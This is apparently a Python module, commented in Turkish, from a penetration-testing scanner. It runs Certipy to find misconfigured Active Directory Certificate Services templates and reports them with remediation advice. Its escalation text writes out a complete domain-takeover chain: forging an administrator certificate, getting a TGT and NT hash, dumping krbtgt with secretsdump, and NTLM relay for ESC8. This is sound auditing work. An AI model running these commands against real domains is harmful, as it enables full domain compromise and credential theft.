"""Certipy ile ADCS (Active Directory Certificate Services) zafiyet enumerasyonu.

ESC1–ESC8 gibi sertifika şablonu/CA yanlış yapılandırmaları, modern AD'de
Domain Admin'e giden en yaygın yoldur: düşük yetkili bir kullanıcı savunmasız
bir şablonla kendine DA kimliğiyle sertifika çıkarıp TGT/NT hash alabilir.

`certipy find -vulnerable` çıktısını okuyup bulunan ESC'leri raporlar. Kimlik
gerektirir (ADCS sorgusu auth ister); kimlik yoksa modül kendini atlar.
Kurulum:  pipx install certipy-ad   (ya da apt install certipy)
"""

from __future__ import annotations

import re

from ..findings import Finding, ScanReport, Severity
from ..runner import CommandResult, ToolStatus, resolve_tool, run, strip_dryrun
from ..util import grep as _grep

CERTIPY_CANDIDATES = ["certipy", "certipy-ad"]

# ESC'lerin kısa açıklamaları (raporu anlamlı kılmak için)
_ESC_DESC = {
    "1": "Şablon client-auth veriyor + enrollee subject belirleyebiliyor (DA taklidi)",
    "2": "Any Purpose / SubCA EKU ile her amaçlı sertifika",
    "3": "Enrollment Agent sertifikası -> başkası adına talep",
    "4": "Şablon ACL'i zayıf (yazılabilir) -> şablonu ESC1'e çevir",
    "6": "CA'da EDITF_ATTRIBUTESUBJECTALTNAME2 -> SAN ekleyerek DA",
    "7": "CA ACL'i zayıf (ManageCA/ManageCertificates)",
    "8": "HTTP web enrollment relay (NTLM relay -> sertifika)",
    "9": "No security extension (szOID) -> kimlik eşleme zayıf",
    "10": "Zayıf sertifika eşleme (StrongCertificateBindingEnforcement/UPN) -> kimlik taklidi",
    "11": "ICertPassage relay (ICPR)",
    "13": "Issuance policy -> yetkili gruba eşleme",
    "14": "Zayıf explicit sertifika eşleme (altSecurityIdentities) -> kimlik taklidi",
    "15": "Uygulama policy (schema v1 şablon) -> EKU enjeksiyonu / client-auth",
    "16": "Security extension CA'da devre dışı -> ESC9 benzeri kimlik eşleme baypası",
}


def tool() -> ToolStatus:
    return resolve_tool(CERTIPY_CANDIDATES)


def scan(
    target: str,
    *,
    domain: str | None = None,
    username: str | None = None,
    password: str | None = None,
    nthash: str | None = None,
    timeout: int = 300,
    dry_run: bool = False,
) -> list[CommandResult]:
    if username is None or not (password or nthash):
        return [CommandResult(
            tool="certipy:skip", argv=[], returncode=None, stdout="", stderr="",
            duration=0.0, error="certipy: kimlik gerekli (ADCS enum auth ister)")]

    bin_name = tool().name
    user = f"{username}@{domain}" if domain else username
    creds = ["-hashes", f":{nthash}"] if nthash else ["-p", password or ""]

    def argv(scheme: str | None) -> list[str]:
        a = [bin_name, "find", "-u", user, "-dc-ip", target, "-vulnerable", "-stdout"]
        if scheme:
            a += ["-ldap-scheme", scheme]
        return a + creds

    # certipy v5 VARSAYILAN LDAPS'tir; bazı DC'lerde TLS reset olur
    # ("socket ssl wrapping error / Connection reset by peer"). Bu durumda düz
    # LDAP (389) ile otomatik tekrar denenir.
    res = run(argv(None), tool="certipy-find", timeout=timeout, dry_run=dry_run)
    if not dry_run and _ldaps_failed(res):
        res2 = run(argv("ldap"), tool="certipy-find", timeout=timeout, dry_run=dry_run)
        return [res2]  # düz LDAP sonucu (LDAPS TLS reset'ine karşı otomatik geçiş)
    return [res]


def _ldaps_failed(res: CommandResult) -> bool:
    """certipy LDAPS bağlantısı TLS/soket düzeyinde başarısız mı oldu?"""
    txt = res.combined or ""
    return bool(re.search(
        r"ssl wrapping|reset by peer|Errno 104|Errno 111|wrap_socket|"
        r"ssl.*error|handshake|EOF occurred|timed out", txt, re.IGNORECASE))


def parse(results: list[CommandResult], report: ScanReport) -> None:
    report.raw_outputs["certipy"] = "\n\n".join(r.combined for r in results)
    combined = strip_dryrun("\n\n".join(r.combined for r in results))
    target = report.target
    _cli = tool().name  # kurulu certipy adı (certipy / certipy-ad) — PoC'ler buna göre

    first = results[0] if results else None
    if first and first.tool == "certipy:skip":
        return  # kimlik yok — sessizce atla
    if first and not first.ok:
        report.add_error(f"certipy: {first.error or 'çalıştırılamadı'}")
        return

    escs = sorted({int(n) for n in re.findall(r"\bESC(\d{1,2})\b", combined)})
    if not escs:
        return

    # Savunmasız şablon + CA adlarını topla (PoC'yi GERÇEK değerlerle doldurmak için)
    templates = re.findall(r"Template Name\s*:\s*(\S+)", combined)
    ca_m = re.search(r"CA Name\s*:\s*(.+)", combined)
    ca_name = ca_m.group(1).strip() if ca_m else ""
    ca_s = ca_name or "<CA-ADI>"
    tpl_s = templates[0] if templates else "<SAVUNMASIZ-TPL>"
    desc = "; ".join(f"ESC{e}: {_ESC_DESC.get(str(e), 'ADCS yanlış yapılandırması')}"
                     for e in escs)
    report.add(Finding(
        title=f"ADCS savunmasız: ESC{', ESC'.join(str(e) for e in escs)} — certipy",
        severity=Severity.CRITICAL, target=target, source="certipy",
        description="Certipy, Domain Admin'e yükseltmeye uygun ADCS yanlış "
                    "yapılandırması buldu. " + desc,
        evidence=_grep(combined, r"ESC\d+|Template Name|CA Name", context=0)
                 + (f"\nŞablonlar: {', '.join(sorted(set(templates))[:10])}" if templates else ""),
        remediation="Savunmasız şablonlarda enrollee-supplies-subject'i kapatın, EKU'ları "
                    "kısıtlayın, şablon/CA ACL'lerini sıkılaştırın, HTTP enrollment'ta "
                    "EPA+HTTPS zorunlu kılın.",
        reference="ADCS ESC1-ESC8 (Certified Pre-Owned)",
        poc=f"{_cli} find -u <user>@<domain> -p <pass> -dc-ip {target} -vulnerable -stdout "
            "-ldap-scheme ldap",
        escalation=(
            f"ESC1/ESC4 — DA kimliğiyle sertifika iste (CA='{ca_s}', şablon='{tpl_s}'):\n"
            f"1) {_cli} req -u <user>@<domain> -p <pass> -dc-ip {target} -ca {ca_s} "
            f"-template {tpl_s} -upn administrator@<domain> -ldap-scheme ldap\n"
            f"2) {_cli} auth -pfx administrator.pfx -dc-ip {target}    (TGT + NT hash döner)\n"
            f"3) secretsdump.py <domain>/administrator@{target} -just-dc    -> krbtgt = DA\n"
            "   • ya da NT hash ile: nxc smb <dc> -u administrator -H <nthash> --ntds\n"
            "ESC8 (web enrollment): coerce + ntlmrelayx --adcs (bkz. coercion bulgusu).\n"
            "ESC6/ESC9/ESC10: -upn ile SAN enjekte et; ESC3: enrollment agent sertifikası.")))


# ---------------------------------------------------------------------------
# Registry adaptörü + kaydı
# ---------------------------------------------------------------------------

from ..registry import ScanContext, ScanModule  # noqa: E402


def _run(ctx: ScanContext) -> list[CommandResult]:
    return scan(ctx.target, domain=ctx.domain, username=ctx.username,
                password=ctx.password, nthash=ctx.nthash,
                timeout=ctx.timeout, dry_run=ctx.dry_run)


MODULE = ScanModule(
    name="certipy",
    label="certipy ADCS ESC zafiyet taraması (opt-in, kimlik gerektirir)",
    run=_run,
    parse=parse,
    requires_creds=True,
    optin=True,
)
